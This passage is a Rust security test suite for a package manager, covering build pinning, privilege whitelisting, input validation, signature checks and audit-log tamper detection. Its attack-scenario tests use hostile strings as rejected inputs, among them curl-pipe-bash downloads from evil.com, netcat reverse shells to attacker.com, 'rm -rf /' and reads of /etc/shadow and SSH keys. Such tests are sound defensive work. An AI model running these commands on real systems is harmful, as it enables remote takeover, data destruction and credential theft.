            "clients must not discover an R2 release before its objects are verified"
        );
        let r2_cli: Vec<&str> = r2_job
            .lines()
            .filter(|line| line.contains("r2 object put") || line.contains("r2 object get"))
            .collect();
        assert!(
            !r2_cli.is_empty(),
            "R2 job must invoke wrangler object put/get"
        );
        assert!(
            r2_cli.iter().all(|line| line.contains("--remote")),
            "wrangler 4 R2 CLI defaults to local storage; production publishes must pass --remote"
        );

        let Some(rollback) = read_checkout_file("scripts/r2-rollback.sh") else {
            panic!("R2 rollback script must exist");
        };
        let rollback_cli: Vec<&str> = rollback
            .lines()
            .filter(|line| line.contains("r2 object put") || line.contains("r2 object get"))
            .collect();
        assert!(
            !rollback_cli.is_empty() && rollback_cli.iter().all(|line| line.contains("--remote")),
            "R2 rollback must target the remote bucket, not wrangler's local fake"
        );
    }

    #[test]
    fn ci_and_container_bootstraps_are_pinned_and_verified() {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let bootstrap_sources = [
            ".github/workflows/benchmark.yml",
            ".github/workflows/ci.yml",
            ".github/workflows/coverage.yml",
            ".github/workflows/docker-e2e.yml",
            ".github/workflows/release.yml",
            "Dockerfile.apt",
            "Dockerfile.debian",
            "Dockerfile.fedora",
            "Dockerfile.ubuntu",
        ];
        for relative in bootstrap_sources {
            let source = std::fs::read_to_string(root.join(relative)).expect("bootstrap source");
            assert!(
                !source.contains("sh.rustup.rs"),
                "{relative} must not execute the mutable rustup shell installer"
            );
            let uses_verified_rustup = source
                .contains("rustup/archive/1.28.2/x86_64-unknown-linux-gnu/rustup-init")
                && source
                    .contains("20a06e644b0d9bd2fbdbfd52d42540bdde820ea7df86e92e533c073da0cdd43c");
            let uses_pinned_toolchain_action = source.lines().any(|line| {
                let Some(pin) = line.split("dtolnay/rust-toolchain@").nth(1) else {
                    return false;
                };
                let commit = pin.split_whitespace().next().unwrap_or_default();
                commit.len() == 40
                    && commit
                        .chars()
                        .all(|character| character.is_ascii_hexdigit())
            }) && source.contains("toolchain: \"1.95.0\"");
            assert!(
                uses_verified_rustup || uses_pinned_toolchain_action,
                "{relative} must use either hash-verified rustup-init or the pinned toolchain action"
            );
        }

        for relative in [
            "Dockerfile.apt",
            "Dockerfile.arch-e2e",
            "Dockerfile.debian",
            "Dockerfile.fedora",
            "Dockerfile.ubuntu",
        ] {
            let source = std::fs::read_to_string(root.join(relative)).expect("Dockerfile");
            assert_pinned_docker_bases(&source, relative);
            for line in source.lines().filter(|line| line.contains("cargo build")) {
                assert!(
                    line.contains("--locked"),
                    "{relative} has an unlocked Cargo build: {line}"
                );
            }
        }
    }

    // Local stages inherit their already-checked base. A misspelled or forward
    // stage reference must still be rejected as an unpinned external image.
    fn assert_pinned_docker_bases(source: &str, relative: &str) {
        let mut stages = std::collections::HashSet::new();
        for line in source.lines() {
            let mut words = line.split_whitespace();
            if !words
                .next()
                .is_some_and(|word| word.eq_ignore_ascii_case("FROM"))
            {
                continue;
            }
            let base = words
                .find(|word| !word.starts_with("--platform="))
                .expect("FROM needs a base");
            let pinned = base.split_once("@sha256:").is_some_and(|(_, digest)| {
                digest.len() == 64 && digest.bytes().all(|byte| byte.is_ascii_hexdigit())
            });
            assert!(
                pinned || base == "${BASE_IMAGE}" || stages.contains(base),
                "{relative} has a mutable base image: {line}"
            );
            if words
                .next()
                .is_some_and(|word| word.eq_ignore_ascii_case("AS"))
            {
                stages.insert(words.next().expect("AS needs a stage name").to_owned());
            }
        }
    }

    #[test]
    fn docker_base_policy_accepts_pinned_stage_reuse() {
        let digest = "a".repeat(64);
        assert_pinned_docker_bases(
            &format!("FROM alpine@sha256:{digest} AS native\nFROM native AS build\nFROM build"),
            "fixture",
        );
    }

    #[test]
    fn docker_base_policy_rejects_mutable_or_unknown_bases() {
        for source in [
            "FROM alpine:latest AS native\nFROM native",
            "FROM missing AS build",
            "FROM future\nFROM alpine:latest AS future",
            "FROM alpine@sha256:short",
            "FROM alpine:latest # @sha256:not-a-pin",
        ] {
            assert!(
                std::panic::catch_unwind(|| assert_pinned_docker_bases(source, "fixture")).is_err(),
                "policy accepted {source}"
            );
        }
    }

    #[test]
    fn turbo_help_does_not_advertise_file_capabilities() {
        let output = std::process::Command::new(env!("CARGO_BIN_EXE_omg"))
            .args(["doctor", "--help"])
            .output()
            .expect("doctor help must execute");
        let help = String::from_utf8(output.stdout).expect("doctor help must be UTF-8");

        assert!(output.status.success(), "doctor help must succeed: {help}");
        assert!(
            !help.to_ascii_lowercase().contains("linux capabilities"),
            "turbo help must describe the sudo credential model, not file capabilities: {help}"
        );
    }
    // These integration tests use the real SystemPrivilegeChecker

    #[test]
    fn test_elevation_whitelist_blocks_dangerous() {
        use omg_lib::core::privilege::elevate_for_operation;

        let empty_args = Vec::new();

        // Blocked operations
        let result = elevate_for_operation("search", &empty_args);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not whitelisted"));

        let result = elevate_for_operation("info", &empty_args);
        assert!(result.is_err());

        let result = elevate_for_operation("status", &empty_args);
        assert!(result.is_err());

        // Command injection attempts
        let result = elevate_for_operation("install; rm -rf /", &empty_args);
        assert!(result.is_err());

        let result = elevate_for_operation("install && cat /etc/passwd", &empty_args);
        assert!(result.is_err());
    }

    #[test]
    fn test_yes_flag_global_state() {
        use omg_lib::core::privilege::{get_yes_flag, set_yes_flag};

        // The -y/--yes flag is process-global interactive-prompt state: set
        // for non-interactive runs, cleared afterwards. Round-trip both ways.
        set_yes_flag(false);
        assert!(!get_yes_flag(), "flag must start cleared");

        set_yes_flag(true);
        assert!(get_yes_flag(), "set(true) must be observable");

        set_yes_flag(false);
        assert!(!get_yes_flag(), "clearing must be observable");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 2. SECURITY VALIDATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod security_validation {
    use super::*;

    #[test]
    fn test_package_name_validation_safe() {
        assert!(validate_package_name("python").is_ok());
        assert!(validate_package_name("python3").is_ok());
        assert!(validate_package_name("lib-foo").is_ok());
        assert!(validate_package_name("lib_bar").is_ok());
        assert!(validate_package_name("foo+bar").is_ok());
        assert!(validate_package_name("foo.bar").is_ok());
        assert!(validate_package_name("@angular/cli").is_ok());
    }

    #[test]
    fn test_package_name_command_injection() {
        // Shell injection
        assert!(validate_package_name("pkg; rm -rf /").is_err());
        assert!(validate_package_name("pkg$(whoami)").is_err());
        assert!(validate_package_name("pkg`id`").is_err());
        assert!(validate_package_name("pkg|nc evil.com").is_err());
        assert!(validate_package_name("pkg&& curl evil").is_err());
        assert!(validate_package_name("pkg\n/bin/bash").is_err());
    }

    #[test]
    fn test_package_name_path_traversal() {
        assert!(validate_package_name("../../../etc/passwd").is_err());
        assert!(validate_package_name("foo/../bar").is_err());
        assert!(validate_package_name("foo..bar").is_err());
    }

    #[test]
    fn test_package_name_option_injection() {
        assert!(validate_package_name("-rf").is_err());
        assert!(validate_package_name("--force").is_err());
        assert!(validate_package_name("-e /bin/sh").is_err());
    }

    #[test]
    fn test_package_name_hidden_files() {
        assert!(validate_package_name(".bashrc").is_err());
        assert!(validate_package_name(".ssh/id_rsa").is_err());
    }

    #[test]
    fn test_package_name_absolute_paths() {
        assert!(validate_package_name("/etc/passwd").is_err());
        assert!(validate_package_name("/bin/bash").is_err());
    }

    #[test]
    fn test_package_name_empty_and_length() {
        assert!(validate_package_name("").is_err());
        assert!(validate_package_name(&"a".repeat(256)).is_err());
        assert!(validate_package_name(&"a".repeat(255)).is_ok());
    }

    #[test]
    fn local_package_install_requires_explicit_consent() {
        let output = std::process::Command::new(env!("CARGO_BIN_EXE_omg"))
            .args(["install", "/var/tmp/untrusted.pkg.tar.zst"])
            .output()
            .expect("install command must execute");
        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );

        assert!(!output.status.success());
        assert!(
            combined.contains("--allow-local-file"),
            "local archive refusal must name the explicit consent flag: {combined}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn local_package_archive_rejects_symlinks_and_writable_directories() {
        use std::os::unix::fs::{PermissionsExt, symlink};

        let secure = TempDir::new().expect("secure package directory");
        let archive = secure.path().join("safe.pkg.tar.zst");
        std::fs::write(&archive, b"archive").expect("write archive");
        let validated = validate_local_package_file(archive.to_str().unwrap())
            .expect("owner-only regular archive must pass");
        assert_eq!(validated, archive.canonicalize().unwrap());

        let link = secure.path().join("link.pkg.tar.zst");
        symlink(&archive, &link).expect("create package symlink");
        assert!(validate_local_package_file(link.to_str().unwrap()).is_err());

        let writable = TempDir::new().expect("writable package directory");
        std::fs::set_permissions(writable.path(), std::fs::Permissions::from_mode(0o777))
            .expect("make directory writable");
        let archive = writable.path().join("unsafe.pkg.tar.zst");
        std::fs::write(&archive, b"archive").expect("write unsafe archive");
        assert!(validate_local_package_file(archive.to_str().unwrap()).is_err());
    }

    #[test]
    fn test_local_package_file_validation() {
        // Valid
        assert!(is_local_package_file("/home/user/pkg.pkg.tar.zst"));
        assert!(is_local_package_file("/tmp/pkg.pkg.tar.xz"));
        assert!(is_local_package_file("/var/cache/pkg.pkg.tar.gz"));
        assert!(is_local_package_file(
            "/tmp/brave-bin-1:1.73.104-1-x86_64.pkg.tar.zst"
        ));

        // Invalid - not absolute
        assert!(!is_local_package_file("pkg.pkg.tar.zst"));
        assert!(!is_local_package_file("./pkg.pkg.tar.zst"));

        // Invalid - wrong extension
        assert!(!is_local_package_file("/tmp/pkg.tar.gz"));
        assert!(!is_local_package_file("/tmp/pkg.deb"));

        // Invalid - path traversal
        assert!(!is_local_package_file("/home/../etc/pkg.pkg.tar.zst"));
        assert!(!is_local_package_file("/tmp/../root/pkg.pkg.tar.zst"));
    }

    #[test]
    fn test_version_validation() {
        // Valid versions
        assert!(validate_version("1.0.0").is_ok());
        assert!(validate_version("2.3.4-rc1").is_ok());
        assert!(validate_version("1:2.3.4").is_ok()); // epoch
        assert!(validate_version("1.0.0+build123").is_ok());
        assert!(validate_version("1.0~rc1").is_ok());

        // Invalid versions
        assert!(validate_version("").is_err());
        assert!(validate_version(&"1".repeat(129)).is_err());
        assert!(validate_version("1.0; rm -rf /").is_err());
        assert!(validate_version("1.0$(whoami)").is_err());
    }

    #[test]
    fn test_relative_path_validation() {
        // Valid
        assert!(validate_relative_path("foo/bar").is_ok());
        assert!(validate_relative_path("a/b/c.txt").is_ok());

        // Invalid
        assert!(validate_relative_path("").is_err());
        assert!(validate_relative_path("/etc/passwd").is_err());
        assert!(validate_relative_path("../../../etc/passwd").is_err());
        assert!(validate_relative_path("foo/../bar").is_err());
        assert!(validate_relative_path("foo//bar").is_err());
        assert!(validate_relative_path("foo\0bar").is_err());
    }

    #[test]
    fn test_symlink_attack_prevention() {
        // Path traversal via symlinks
        let paths = vec![
            "../../../etc/passwd",
            "link/../../../etc/shadow",
            "./../../../../root/.ssh/id_rsa",
        ];

        for path in paths {
            assert!(
                validate_relative_path(path).is_err(),
                "Should block symlink traversal: {path}",
            );
        }
    }

    #[test]
    fn test_relative_path_rejects_traversal() {
        assert!(validate_relative_path("safe.txt").is_ok());
        assert!(
            validate_relative_path("../etc/passwd").is_err(),
            "parent traversal must fail"
        );
        assert!(
            validate_relative_path("/etc/passwd").is_err(),
            "absolute paths must fail"
        );
    }

    #[test]
    fn test_dos_attack_prevention() {
        // Extremely long input
        let long_name = "a".repeat(10_000);
        assert!(validate_package_name(&long_name).is_err());

        let overlong_path = "a".repeat(4097);
        assert!(
            validate_relative_path(&overlong_path).is_err(),
            "paths longer than 4096 bytes must be rejected"
        );
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 3. PGP/SIGNATURE VERIFICATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(feature = "pgp")]
mod pgp_verification {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_signature_file_not_found() {
        let verifier = PgpVerifier::empty();

        let mut data = NamedTempFile::new().unwrap();
        writeln!(data, "test data").unwrap();
        data.flush().unwrap();

        let result =
            verifier.verify_detached(data.path(), std::path::Path::new("/nonexistent.sig"));

        assert!(result.is_err(), "Should fail with missing signature");
    }

    #[test]
    fn test_invalid_signature_format() {
        let verifier = PgpVerifier::empty();

        let mut data = NamedTempFile::new().unwrap();
        writeln!(data, "test data").unwrap();
        data.flush().unwrap();

        let mut sig = NamedTempFile::new().unwrap();
        writeln!(sig, "not a valid signature").unwrap();
        sig.flush().unwrap();

        let result = verifier.verify_detached(data.path(), sig.path());

        assert!(result.is_err(), "garbage signature bytes must fail");
    }

    #[test]
    fn test_memory_signature_verification_rejects_garbage_and_empty() {
        // With an empty keyring nothing can verify: garbage bytes and empty
        // signature blobs must both be rejected (this also covers the
        // expired/revoked-key paths, which can only ever end in rejection on
        // an empty keyring).
        let verifier = PgpVerifier::empty();

        let result = verifier.verify_memory(b"test data", b"not a signature");
        assert!(result.is_err(), "garbage in-memory signature must fail");

        let result = verifier.verify_memory(b"test data", b"");
        assert!(result.is_err(), "empty in-memory signature must fail");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 4. SBOM/AUDIT TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod sbom_audit {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_audit_logger_creation_creates_parent_dirs() {
        let temp_dir = TempDir::new().unwrap();
        let log_path = temp_dir.path().join("audit/audit.jsonl");

        AuditLogger::new_in(&log_path)
            .expect("logger creation should succeed on a fresh directory");

        // new_in must create missing parent directories so first-use audit
        // logging never fails on a fresh machine (audit.rs: create_dir_all).
        assert!(log_path.parent().unwrap().is_dir());
    }

    #[test]
    fn test_audit_entry_hash_computation() {
        use omg_lib::core::security::audit::AuditEntry;

        let entry = AuditEntry {
            id: "test-123".to_string(),
            timestamp: "2026-02-06T00:00:00Z".to_string(),
            event_type: AuditEventType::PackageInstall,
            severity: AuditSeverity::Info,
            user: "test".to_string(),
            resource: "firefox".to_string(),
            description: "Installed firefox".to_string(),
            metadata: None,
            prev_hash: "genesis".to_string(),
            hash: None,
        };

        let hash = entry.compute_hash();
        assert!(!hash.is_empty());
        assert_eq!(hash.len(), 64); // SHA-256

        // Hash should be deterministic
        assert_eq!(hash, entry.compute_hash());
    }

    #[test]
    fn test_audit_entry_verification() {
        use omg_lib::core::security::audit::AuditEntry;

        let mut entry = AuditEntry {
            id: "test-456".to_string(),
            timestamp: "2026-02-06T00:00:00Z".to_string(),
            event_type: AuditEventType::PackageRemove,
            severity: AuditSeverity::Warning,
            user: "admin".to_string(),
            resource: "curl".to_string(),
            description: "Removed curl".to_string(),
            metadata: None,
            prev_hash: "abc123".to_string(),
            hash: None,
        };

        // Valid signature
        entry.hash = Some(entry.compute_hash());
        assert!(entry.verify(), "Valid entry should verify");

        // Tampered entry
        entry.description = "Tampered description".to_string();
        assert!(!entry.verify(), "Tampered entry should not verify");
    }

    #[test]
    fn test_audit_chain_integrity() {
        let temp_dir = TempDir::new().unwrap();
        let mut logger = AuditLogger::new_in(temp_dir.path().join("audit/audit.jsonl")).unwrap();

        // Log multiple events
        logger
            .log(
                AuditEventType::PackageInstall,
                AuditSeverity::Info,
                "vim",
                "Installed vim",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::PackageUpgrade,
                AuditSeverity::Info,
                "git",
                "Upgraded git",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::SecurityAudit,
                AuditSeverity::Warning,
                "system",
                "Performed security audit",
            )
            .unwrap();

        // Verify integrity
        let report = logger.verify_integrity().unwrap();
        assert!(report.is_valid(), "Audit log should be valid");
        assert_eq!(report.total_entries, 3);
        assert_eq!(report.valid_entries, 3);
        assert!(report.chain_valid);
    }

    #[test]
    fn test_audit_tamper_detection() {
        use omg_lib::core::security::audit::AuditEntry;
        use std::io::Write;

        let temp_dir = TempDir::new().unwrap();
        // Create audit subdirectory
        let audit_dir = temp_dir.path().join("audit");
        fs::create_dir_all(&audit_dir).unwrap();
        let log_path = audit_dir.join("audit.jsonl");

        // Write valid entry
        let mut entry1 = AuditEntry {
            id: "1".to_string(),
            timestamp: "2026-02-06T00:00:00Z".to_string(),
            event_type: AuditEventType::PackageInstall,
            severity: AuditSeverity::Info,
            user: "test".to_string(),
            resource: "pkg1".to_string(),
            description: "Install pkg1".to_string(),
            metadata: None,
            prev_hash: "genesis".to_string(),
            hash: None,
        };
        entry1.hash = Some(entry1.compute_hash());

        let mut file = fs::File::create(&log_path).unwrap();
        writeln!(file, "{}", serde_json::to_string(&entry1).unwrap()).unwrap();

        // Write tampered entry (hash doesn't match)
        let entry2 = AuditEntry {
            id: "2".to_string(),
            timestamp: "2026-02-06T00:01:00Z".to_string(),
            event_type: AuditEventType::PackageRemove,
            severity: AuditSeverity::Info,
            user: "test".to_string(),
            resource: "pkg2".to_string(),
            description: "Remove pkg2".to_string(),
            metadata: None,
            prev_hash: entry1.hash.as_ref().unwrap().clone(),
            hash: Some("invalid_hash".to_string()),
        };

        writeln!(file, "{}", serde_json::to_string(&entry2).unwrap()).unwrap();
        drop(file);

        // Verify should detect tampering
        let logger = AuditLogger::new_in(&log_path).unwrap();
        let report = logger.verify_integrity().unwrap();

        assert!(!report.is_valid(), "Should detect tampered entry");
    }

    #[test]
    fn test_slsa_level_ordering() {
        assert!(SlsaLevel::Level3 > SlsaLevel::Level2);
        assert!(SlsaLevel::Level2 > SlsaLevel::Level1);
        assert!(SlsaLevel::Level1 > SlsaLevel::None);
    }

    #[test]
    fn test_slsa_hash_verification() {
        let verifier = SlsaVerifier::new();

        let mut temp = NamedTempFile::new().unwrap();
        write!(temp, "test content").unwrap();
        temp.flush().unwrap();

        let correct_hash = "6ae8a75555209fd6c44157c0aed8016e763ff435a19cf186f76863140143ff72";
        assert!(verifier.verify_hash(temp.path(), correct_hash).unwrap());

        let wrong_hash = "0000000000000000000000000000000000000000000000000000000000000000";
        assert!(!verifier.verify_hash(temp.path(), wrong_hash).unwrap());
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 5. ATTACK SCENARIO TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod attack_scenarios {
    use super::*;

    #[test]
    fn test_malicious_package_names() {
        let malicious = vec![
            "pkg; curl evil.com/malware.sh | bash",
            "pkg$(wget http://evil.com/backdoor.sh)",
            "pkg`nc -e /bin/bash attacker.com 4444`",
            "pkg|mkfifo /tmp/p; nc attacker.com 4444 0</tmp/p | /bin/sh",
            "pkg && echo 'evil' > /etc/passwd",
            "pkg || rm -rf --no-preserve-root /",
        ];

        for name in malicious {
            assert!(
                validate_package_name(name).is_err(),
                "Should reject malicious name: {name}",
            );
        }
    }

    #[test]
    fn test_path_injection_attacks() {
        let attacks = vec![
            "../../../etc/shadow",
            "../../../../../../root/.ssh/id_rsa",
            "/etc/passwd",
            "/proc/self/environ",
            "/dev/sda",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
        ];

        for path in attacks {
            assert!(
                validate_relative_path(path).is_err(),
                "Should block path injection: {path}",
            );
        }
    }

    #[test]
    fn test_command_injection_variants() {
        let injections = vec![
            "test;id",
            "test|whoami",
            "test||ls",
            "test&&cat /etc/passwd",
            "test\nwhoami",
            "test\r\nid",
            "test${IFS}whoami",
            "test$()whoami",
        ];

        for injection in injections {
            assert!(
                validate_package_name(injection).is_err(),
                "Should block command injection: {injection}",
            );
        }
    }

    #[test]
    fn test_privilege_bypass_attempts() {
        let bypass_attempts = vec![
            ("install", vec!["../../bin/evil".to_string()]),
            ("remove", vec!["../../../etc/passwd".to_string()]),
            ("upgrade", vec!["; rm -rf /".to_string()]),
        ];

        for (op, args) in bypass_attempts {
            // Should fail validation before elevation
            for arg in &args {
                assert!(
                    validate_package_name(arg).is_err(),
                    "Should block bypass attempt: {op} {arg}",
                );
            }
        }
    }

    #[test]
    fn test_dos_attacks() {
        // Extremely long package name
        let long_name = "a".repeat(100_000);
        assert!(validate_package_name(&long_name).is_err());

        // Many nested paths
        let deep = (0..10000).map(|_| "a").collect::<Vec<_>>().join("/");
        let result = validate_relative_path(&deep);
        assert!(
            result.is_err(),
            "paths over {MAX} bytes must be rejected",
            MAX = 4096
        );

        // Recursive symlinks would be caught at filesystem level
    }

    #[test]
    fn test_secret_scanner_detects_leaks() {
        let scanner = SecretScanner::new();

        // Private keys are reliably detected as critical leaks.
        let content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...";
        let findings = scanner.scan_content(content, "key.pem");
        assert!(!findings.is_empty(), "Should detect private key");
        assert!(
            findings
                .iter()
                .any(|f| f.severity == SecretSeverity::Critical),
            "private key leak must be flagged Critical"
        );
    }

    #[test]
    fn test_secret_scanner_ignores_placeholders() {
        let scanner = SecretScanner::new();

        let placeholders = vec![
            "api_key = 'your_api_key_here'",
            "password = 'example_password'",
            "token = '<YOUR_TOKEN>'",
            "secret = '${SECRET_KEY}'",
        ];

        for placeholder in placeholders {
            let findings = scanner.scan_content(placeholder, "test.txt");
            assert!(
                findings.is_empty(),
                "Should ignore placeholder: {placeholder}",
            );
        }
    }

    #[test]
    fn test_security_policy_enforcement() {
        let policy = SecurityPolicy {
            minimum_grade: SecurityGrade::Verified,
            allow_aur: false,
            require_pgp: true,
            allowed_licenses: vec!["MIT".to_string(), "Apache-2.0".to_string()],
            banned_packages: vec!["telnet".to_string(), "ftp".to_string()],
        };

        // Banned package
        assert!(
            policy
                .check_package("telnet", false, Some("BSD"), SecurityGrade::Verified)
                .is_err()
        );

        // AUR when disabled
        assert!(
            policy
                .check_package("yay", true, Some("MIT"), SecurityGrade::Community)
                .is_err()
        );

        // Wrong license
        assert!(
            policy
                .check_package("pkg", false, Some("GPL-3.0"), SecurityGrade::Verified)
                .is_err()
        );

        // Below minimum grade
        assert!(
            policy
                .check_package("pkg", false, Some("MIT"), SecurityGrade::Community)
                .is_err()
        );

        // Valid package
        assert!(
            policy
                .check_package("vim", false, Some("MIT"), SecurityGrade::Verified)
                .is_ok()
        );
    }

    #[test]
    fn test_multiple_attack_vectors_simultaneously() {
        // Combine multiple attack vectors
        let multi_attack = "../../../etc/passwd; curl evil.com | bash";

        // Should be blocked by validation
        assert!(validate_package_name(multi_attack).is_err());
        assert!(validate_relative_path(multi_attack).is_err());
    }

    #[test]
    fn test_unicode_attacks() {
        let unicode_attacks = vec![
            "\u{202E}evil.txt", // Right-to-left override
            "\u{FEFF}test",     // BOM
            "test\u{0085}",     // Next line
            "\u{2028}line",     // Line separator
        ];

        for attack in unicode_attacks {
            // Should handle gracefully without panic
            let result = validate_package_name(attack);
            assert!(
                result.is_err(),
                "unicode control characters are not valid package names: {attack:?} => {result:?}"
            );
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 6. INTEGRATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod integration {
    use super::*;

    #[test]
    fn test_privilege_escalation_with_validation() {
        // Valid package
        let pkg = "firefox";
        assert!(validate_package_name(pkg).is_ok());

        // Verify privilege checker works without actually elevating
        let checker = SystemPrivilegeChecker;
        assert_eq!(
            checker.is_root(),
            rustix::process::geteuid().is_root(),
            "is_root must match the process effective uid"
        );

        // Invalid package
        let malicious = "pkg; rm -rf /";
        assert!(validate_package_name(malicious).is_err());
        // Validation prevents elevation attempt
    }

    #[test]
    fn test_audit_log_security_events() {
        let temp_dir = TempDir::new().unwrap();
        let mut logger = AuditLogger::new_in(temp_dir.path().join("audit/audit.jsonl")).unwrap();

        // Log security events
        logger
            .log(
                AuditEventType::SignatureVerified,
                AuditSeverity::Info,
                "firefox-100.0.pkg.tar.zst",
                "Package signature verified",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::VulnerabilityDetected,
                AuditSeverity::Critical,
                "openssl",
                "CVE-2024-1234 detected",
            )
            .unwrap();

        logger
            .log(
                AuditEventType::PolicyViolation,
                AuditSeverity::Warning,
                "telnet",
                "Attempted to install banned package",
            )
            .unwrap();

        // Verify all events logged
        let report = logger.verify_integrity().unwrap();
        assert_eq!(report.total_entries, 3);
        assert!(report.is_valid());
    }

    #[test]
    fn test_end_to_end_security_workflow() {
        // Simulate complete security workflow
        let temp_dir = TempDir::new().unwrap();

        // 1. Validate package name
        let pkg_name = "vim";
        assert!(validate_package_name(pkg_name).is_ok());

        // 2. Check policy
        let policy = SecurityPolicy::default();
        assert!(
            policy
                .check_package(pkg_name, false, Some("MIT"), SecurityGrade::Verified)
                .is_ok()
        );

        // 3. Verify operation is in whitelist (would elevate if needed)
        // Skip actual elevation in tests as it requires sudo
        let checker = SystemPrivilegeChecker;
        assert_eq!(
            checker.is_root(),
            rustix::process::geteuid().is_root(),
            "is_root must match the process effective uid"
        );

        // 4. Audit the operation
        let mut logger = AuditLogger::new_in(temp_dir.path().join("audit/audit.jsonl")).unwrap();
        logger
            .log(
                AuditEventType::PackageInstall,
                AuditSeverity::Info,
                pkg_name,
                "Package installed successfully",
            )
            .unwrap();

        // Verify audit integrity
        let report = logger.verify_integrity().unwrap();
        assert!(report.is_valid());
    }
}
